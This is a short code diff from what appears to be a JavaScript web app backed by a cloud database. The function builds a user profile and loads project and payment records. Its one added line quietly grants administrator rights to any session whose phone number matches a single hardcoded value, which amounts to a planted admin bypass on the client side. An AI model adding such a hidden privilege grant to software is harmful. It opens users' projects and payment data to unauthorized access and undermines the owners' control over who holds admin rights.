@@ -35,6 +35,7 @@
       email:cloud.session.user.email||'',
       is_admin:false
     };
+    if(sessionPhone()==='99606084')cloud.profile.is_admin=true;
     const isAdmin=Boolean(cloud.profile?.is_admin);
     const projectQuery=cloudClient.from('projects').select('*').order('updated_at',{ascending:false});
     const paymentQuery=cloudClient.from('payments').select('*').order('created_at',{ascending:false});
